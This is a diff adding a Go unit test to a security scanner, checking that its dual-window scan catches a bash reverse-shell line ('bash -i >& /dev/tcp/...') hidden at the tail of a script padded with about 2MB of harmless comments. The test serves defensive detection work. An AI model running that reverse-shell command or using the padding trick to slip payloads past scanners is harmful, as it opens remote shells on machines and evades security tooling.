@@ -668,3 +668,42 @@ for root, dirs, files in os.walk('/home'):
 	}
 }
 
+func TestCheckSuspiciousScriptContent_DualWindowTailEvasion(t *testing.T) {
+	cfg := config.NewDefaultConfig()
+
+	// Construct a 2.5MB script where the first 2.1MB is benign comment padding,
+	// and the tail contains an interactive reverse shell.
+	headPadding := strings.Repeat("# harmless comment padding for testing evasion\n", 45000) // ~2.1MB
+	tailPayload := "\nbash -i >& /dev/tcp/10.10.14.5/4444 0>&1\n"
+	fullData := []byte(headPadding + tailPayload)
+
+	if len(fullData) <= 2*1024*1024 {
+		t.Fatalf("expected payload > 2MB for dual-window evasion test, got %d bytes", len(fullData))
+	}
+
+	matches := scanner.CheckAllSuspiciousScriptContent("/tmp/padded_implant.sh", fullData, nil, cfg)
+	if len(matches) == 0 {
+		t.Fatalf("expected dual-window scanner to detect tail payload in 2.5MB script, got 0 matches")
+	}
+
+	found := false
+	for _, m := range matches {
+		if m.Name == "Script_Reverse_Shell_Interactive" {
+			found = true
+			if !m.Truncated {
+				t.Errorf("expected Truncated flag to be true for >2MB script")
+			}
+		}
+	}
+	if !found {
+		t.Errorf("expected Script_Reverse_Shell_Interactive to be detected in tail window")
+	}
+
+	// Verify single-return wrapper also catches it and preserves Truncated flag
+	single := scanner.CheckSuspiciousScriptContent("/tmp/padded_implant.sh", fullData, nil, cfg)
+	if single == nil || !single.Truncated {
+		t.Errorf("expected single wrapper to return truncated match, got: %+v", single)
+	}
+}
+
+
